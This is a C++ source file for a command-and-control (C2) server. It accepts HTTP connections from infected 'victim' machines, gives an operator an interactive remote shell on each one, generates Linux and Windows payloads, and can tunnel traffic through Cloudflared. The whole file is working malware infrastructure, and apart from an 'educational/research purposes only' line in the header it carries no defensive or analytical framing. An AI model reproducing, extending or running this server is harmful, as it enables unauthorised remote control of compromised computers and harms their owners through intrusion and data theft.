/**
 * ==========================================================
 * Remote C2 Server
 * 
 * This program implements a basic HTTP-based Command & Control (C2) server.
 * The C2 server allows an operator to:
 * 
 * - Accept remote connections from infected clients ("victims").
 * - Interact with each client using a reverse shell mechanism.
 * - Generate payloads for Linux and Windows to deploy on clients.
 * - Manage multiple clients via an interactive shell.
 * 
 * Communication happens via HTTP POST/GET requests tunneled through Cloudflared (optional).
 * 
 * Author: YOU
 * License: For educational/research purposes only!
 * ==========================================================
 */

#include <iostream>
#include <cstring>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <thread>
#include <future>
#include <unordered_map>
#include <string>
#include <vector>
#include <sstream>
#include <regex>
#include <random>
#include "c2_utils.cpp"            // Utility functions (banner, help, show_shell)
#include "PayloadGenerator.cpp"    // Functions to generate OS-specific payloads

using namespace std;

/**
 * Server configuration parameters.
 */
int PORT;                         ///< Port on which server will run (randomized).
int BUFFER_SIZE = 1024;            ///< Buffer size for socket communication.
int CONNECTION_COUNT = 10;         ///< Max simultaneous pending connections.

/**
 * Global variables.
 */
unordered_map<string, int> mp;     ///< Map of connected clients: <victim_name, socket_fd>.
string user_input;                 ///< Stores current user input (shared with shell and client).
string cloudflared_url;            ///< Public Cloudflared URL.

/**
 * Function declarations.
 */
void server();
void client_connection(int server_fd);
void serve_client(string endpoint, int server_fd);
string url_decode(const string& request);
void shell(unordered_map<string, int>& mp, int server_fd);
string get_victim(const char* buffer);

/**
 * @brief Extracts the victim name from an HTTP GET request.
 * 
 * The server expects the client to send a GET request of the form:
 *     GET /?user=<victim_name> HTTP/1.1
 * 
 * @param buffer The raw HTTP request buffer.
 * @return The extracted victim name, or empty string if not found.
 */
string get_victim(const char* buffer) {
    string request_line(buffer);

    size_t first_space = request_line.find(' ');
    if (first_space == string::npos) return "";

    size_t second_space = request_line.find(' ', first_space + 1);
    if (second_space == string::npos) return "";

    string path = request_line.substr(first_space + 1, second_space - first_space - 1);

    size_t user_pos = path.find("?user=");
    if (user_pos == string::npos) return "";

    string user_value = path.substr(user_pos + 6);

    size_t amp_pos = user_value.find('&');
    if (amp_pos != string::npos) {
        user_value = user_value.substr(0, amp_pos);
    }

    return user_value;
}

/**
 * @brief Main shell interface for the C2 server.
 * 
 * Allows the operator to:
 * - View connected clients
 * - Enter an interactive shell with a specific client
 * - Generate Windows/Linux payloads
 * - Exit the server cleanly
 * 
 * @param mp The map of connected clients.
 * @param server_fd The server socket file descriptor.
 */
void shell(unordered_map<string, int>& mp, int server_fd) {
    cout << "\n[+] Welcome to Remote Shell Controller\n";
    cout << "    Type 'help' to see available commands.\n\n";

    while (true) {
        string shell_command;
        cout << "[MainShell] > ";
        getline(cin >> ws, shell_command);

        // Tokenize the command into words.
        stringstream ss(shell_command);
        string token;
        vector<string> tokens;
        while (ss >> token) {
            tokens.push_back(token);
        }

        if (shell_command == "help") {
            help();
            cout << endl;
        } else if (shell_command == "banner") {
            banner();
            cout << endl;
        } else if (shell_command == "show shell") {
            show_shell(mp);
            cout << endl;
        } 
        else if (tokens.size() == 2 && tokens[0] == "shell") {
            // Enter interactive shell with client.
            string victim_name = tokens[1];
            if (mp.find(victim_name) != mp.end()) {
                serve_client(victim_name, server_fd);
            } else {
                cout << "\n[-] Victim ID not found.\n\n";
            }
        }
        else if (tokens.size() == 2 && tokens[0] == "generate") {
            // Generate payload for target OS.
            string os_token = tokens[1];
            if (os_token == "os=windows") {
                string payload = payload_generator_windows(cloudflared_url);
                cout << "\n" << payload << "\n" << endl;
            } else if (os_token == "os=linux") {
                string payload = payload_generator_linux(cloudflared_url);
                cout << "\n" << payload << "\n" << endl;
            } else {
                cout << "OS not found or not supported.\n";
            }
        }
        else if (shell_command == "quit") {
            // Cleanly close server by killing process on port.
            string command = "sudo kill $(sudo lsof -ti :" + to_string(PORT) + ") 2>&1 &";
            system(command.c_str());
            cout << "\nServer closed..." << endl;
            break;
        }
        else {
            cout << "\n[-] Unknown command. Type 'help' to see available commands.\n\n";
        }
    }
}

/**
 * @brief Decodes a URL-encoded "Result" parameter from an HTTP POST body.
 * 
 * Example:
 *     Result=Hello%20World
 *     -> returns "Hello World"
 * 
 * @param request The URL-encoded request string.
 * @return The decoded Result value.
 */
string url_decode(const string& request) {
    regex result_regex("Result=([^&\\s]*)");
    smatch matches;

    if (regex_search(request, matches, result_regex)) {
        if (matches.size() > 1) {
            string encoded_value = matches[1].str();
            string decoded;

            for (size_t i = 0; i < encoded_value.size(); ++i) {
                if (encoded_value[i] == '%' && i + 2 < encoded_value.size()) {
                    int hex_value;
                    istringstream hex_stream(encoded_value.substr(i + 1, 2));
                    hex_stream >> hex >> hex_value;
                    decoded += static_cast<char>(hex_value);
                    i += 2;
                } else if (encoded_value[i] == '+') {
                    decoded += ' ';
                } else {
                    decoded += encoded_value[i];
                }
            }
            return decoded;
        }
    }
    return "";
}

/**
 * @brief Interactive shell session with a specific client.
 * 
 * Sends operator commands to the client and prints client responses.
 * Handles:
 * - Command execution
 * - Shell exit
 * - Client disconnection
 * 
 * @param endpoint The victim name of the client.
 * @param server_fd The server socket file descriptor.
 */
void serve_client(string endpoint, int server_fd) {
    bool flag = true;
    bool terminate_client = false;
    string local_user_input;
    mutex input_mutex;
    bool input_ready = false;
    atomic<bool> need_prompt = true;

    cout << "\n[+] Entering remote shell with client '" << endpoint << "'\n";
    cout << "    Type 'quit' to return to MainShell.\n\n";

    // Launch input thread to read operator commands.
    auto input_func = [&]() {
        cout << "(Shell@" << endpoint << ") > " << flush;
        while (flag) {
            if (need_prompt) {
                need_prompt = false;
            }

            string temp_input;
            getline(cin >> ws, temp_input);

            if (temp_input == "quit" || temp_input == "exit") {
                // Return to MainShell.
                
                lock_guard<mutex> lock(input_mutex);
                local_user_input = "";
                input_ready = true;
                flag = false;
            } else {
                // Normal command.
                lock_guard<mutex> lock(input_mutex);
                local_user_input = temp_input;
                input_ready = true;
            }
        }
    };

    auto fut = async(launch::async, input_func);

    // Main loop: handle client messages and send commands.
    while (flag || input_ready) {
        string full_request;

        // Read HTTP headers.
        while (full_request.find("\r\n\r\n") == string::npos) {
            char buffer[BUFFER_SIZE] = {0};
            ssize_t valread = read(mp[endpoint], buffer, BUFFER_SIZE - 1);

            if (valread <= 0) {
                close(mp[endpoint]);
                mp.erase(endpoint);
                flag = false;
                break;
            }

            full_request += string(buffer, valread);
        }

        if (!flag && !input_ready) {
            break;
        }

        // Extract Content-Length header.
        size_t content_length_pos = full_request.find("Content-Length:");
        size_t body_start_pos = full_request.find("\r\n\r\n");

        int content_length = 0;
        if (content_length_pos != string::npos && body_start_pos != string::npos) {
            size_t start = content_length_pos + strlen("Content-Length:");
            size_t end = full_request.find("\r\n", start);
            string length_str = full_request.substr(start, end - start);

            try {
                content_length = stoi(length_str);
            } catch (...) {
                content_length = 0;
            }
        }

        // Read full HTTP body.
        string body_data = full_request.substr(body_start_pos + 4);

        while ((int)body_data.length() < content_length) {
            char buffer[BUFFER_SIZE] = {0};
            ssize_t valread = read(mp[endpoint], buffer, BUFFER_SIZE - 1);

            if (valread <= 0) {
                flag = false;
                break;
            }

            body_data += string(buffer, valread);
        }

        if (!flag && !input_ready) {
            break;
        }

        // Process HTTP POST result.
        if (full_request.find("POST") != string::npos) {
            int check=full_request.find("ERROR");
            string result = url_decode(body_data);
            if(check<=0){
                write_log(endpoint,local_user_input,result,"SUCCESS");
            }
            else{
                write_log(endpoint,local_user_input,"","FAILED");
            }
            cout << result <<"\n"<< "(Shell@" << endpoint << ") > " << flush;
            need_prompt = true;
        }
        // Send command to client.
        string body;
        {
            lock_guard<mutex> lock(input_mutex);
            if (input_ready) {
                body = local_user_input;
                input_ready = false;
            }
        }

        string response = "HTTP/1.1 200 OK\r\n"
                          "Content-Type: text/plain\r\n"
                          "Content-Length: " + to_string(body.length()) + "\r\n"
                          "Connection: keep-alive\r\n"
                          "\r\n" + body;

        send(mp[endpoint], response.c_str(), response.length(), 0);

        // Handle exit or quit.
        // if (terminate_client && body == "exit") {
        //     close(mp[endpoint]);
        //     mp.erase(endpoint);
        //     break;
        // }

        if (!flag && !terminate_client) {
            break;
        }
    }

    cout << "\n[+] Exited remote shell of client '" << endpoint << "'\n\n";
}

/**
 * @brief Accepts incoming client connections in a separate thread.
 * 
 * For each client:
 * - Extract victim name.
 * - Store socket fd in map.
 * - Send initial HTTP 200 OK response.
 * 
 * @param server_fd The server socket file descriptor.
 */
void client_connection(int server_fd) {
    socklen_t addrlen;
    struct sockaddr_in client_addr;

    while (true) {
        addrlen = sizeof(client_addr);
        int client_conn = accept(server_fd, (struct sockaddr*)&client_addr, &addrlen);
        if (client_conn < 0) {
            perror("Accept failed");
            continue;
        }

        char buffer[BUFFER_SIZE] = {0};
        int valread = read(client_conn, buffer, BUFFER_SIZE - 1);

        if (valread <= 0) {
            close(client_conn);
            break;
        }

        string endpoint = get_victim(buffer);
        if (mp.find(endpoint) == mp.end()) {
            cout << "\n====================================\n";
            cout << "  [+] New connection: " << endpoint << "\n";
            cout << "====================================\n\n";
            cout << "[MainShell] > " << flush;
        }

        string body = "";
        mp[endpoint] = client_conn;
        string response = "HTTP/1.1 200 OK\r\n"
                          "Content-Type: text/plain\r\n"
                          "Content-Length: " + to_string(body.length()) + "\r\n"
                          "Connection: keep-alive\r\n"
                          "\r\n" + body;

        send(mp[endpoint], response.c_str(), response.length(), 0);
    }
}

/**
 * @brief Starts the C2 server.
 */
void server() {
    int server_fd;
    struct sockaddr_in address, client_addr;
    socklen_t addrlen = sizeof(client_addr);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_port = htons(PORT);
    address.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("Binding failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, CONNECTION_COUNT) < 0) {
        perror("Listening failed");
        exit(EXIT_FAILURE);
    }

    cout << "\n[+] HTTP server running on port " << PORT << "\n\n";

    thread client_thread(client_connection, server_fd);
    client_thread.detach();

    shell(mp, server_fd);

    close(server_fd);
}

/**
 * @brief Entry point of the C2 server application.
 * 
 * Starts the Cloudflared tunnel (if possible), launches the server.
 * 
 * @return int 
 */
int main(int argc, char* argv[]) {
    banner();

    // Join all arguments into a single string
    string args;
    for (int i = 1; i < argc; ++i) {
        args += string(argv[i]) + " ";
    }

    // Tokenize the arguments
    stringstream ss(args);
    string token;
    vector<string> tokens;
    while (ss >> token) {
        tokens.push_back(token);
    }

    // Find the "-p" argument
    auto it = find(tokens.begin(), tokens.end(), "-p");
    if (it == tokens.end() || (it + 1) == tokens.end()) {
        // No port specified, pick random port
        char ch;
        cout<<"No port is specified select (Y/N) to start the server with random port:";
        cin>>ch;
        ch=toupper(ch);
        if(ch=='Y'){
            random_device rd;
            mt19937 gen(rd());
            uniform_int_distribution<> dis(1000, 10000);
            PORT = dis(gen);
        }
        else if(ch=='N'){
            cout<<"specify port with -p <port number>";
            return 0;
        }
        else{
            cout<<"Wrong choice";
            return 0;
        }
    } else {
        try {
            int port_candidate = stoi(*(it + 1));
            if (port_candidate > 0 && port_candidate <= 65535) {
                PORT = port_candidate;
            } else {
                cout << "The port number is not in range (1-65535)" << endl;
                return 1;
            }
        } catch (...) {
            cout << "Invalid port number format" << endl;
            return 1;
        }
    }

    // Attempt to create tunnel
    cloudflared_url = start_cloudflared(PORT);
    if (cloudflared_url.empty()) {
        string ip = get_device_ip();
        cout << "Failed to create tunnel" << endl;
        cloudflared_url = "http://" + ip + ':' + to_string(PORT);
        cout << cloudflared_url << endl;
    } else {
        cout << "Tunnel created successfully: " << cloudflared_url << endl;
    }

    server();
    return 0;
}